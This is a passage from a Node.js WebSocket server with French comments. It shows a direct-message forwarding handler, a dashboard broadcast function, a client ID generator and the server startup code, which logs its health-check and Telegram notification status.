  console.log(`[DirectMessage] ✅ Sender: ${senderId} (${sender.role}), Target: ${targetId}`);
  console.log(`[DirectMessage] Payload:`, JSON.stringify(data.payload, null, 2));

  // Envoyer le message au client cible
  if (targetClient.ws.readyState === 1) {
    try {
      const message = {
        type: 'direct',
        payload: data.payload || data
      };
      targetClient.ws.send(JSON.stringify(message));
      console.log(`[DirectMessage] ✅ Direct message sent to client ${targetId}`);
    } catch (error) {
      console.error(`[DirectMessage] ❌ Error sending direct message:`, error);
    }
  } else {
    console.log(`[DirectMessage] ❌ WebSocket is not OPEN (readyState: ${targetClient.ws.readyState})`);
  }
}

// Diffuser aux dashboards
function broadcastToDashboards(message) {
  const messageStr = JSON.stringify(message);
  dashboards.forEach(dashboard => {
    if (dashboard.readyState === WebSocket.OPEN) {
      dashboard.send(messageStr);
    }
  });
}

// Générer un ID client unique
function generateClientId() {
  return `client-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
}

// Démarrer le serveur
server.listen(PORT, '0.0.0.0', () => {
  console.log(`WebSocket server running on port ${PORT}`);
  console.log(`HTTP health check available at http://0.0.0.0:${PORT}/health`);
  if (telegram.enabled) {
    console.log('Telegram notifications enabled');
  } else {
    console.log('Telegram notifications disabled (configure .env)');
  }
});

